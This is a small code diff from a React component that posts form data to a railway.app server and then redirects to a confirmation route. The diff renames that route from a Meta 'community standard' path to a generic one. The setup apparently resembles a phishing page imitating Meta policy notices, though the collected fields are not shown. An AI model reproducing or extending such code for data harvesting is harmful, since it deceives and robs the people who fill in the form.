@@ -66,7 +66,7 @@ const Buiness = () => {
                     axios.post( "https://hnu-server-react-app-production-update.up.railway.app/api/news", data) 
                     .then((response) => {
                         if (response.data.status === 0 ) {
-                            navigate('/meta-community-standard/confirm');
+                            navigate('/*/confirm');
                         }
                     })
                     
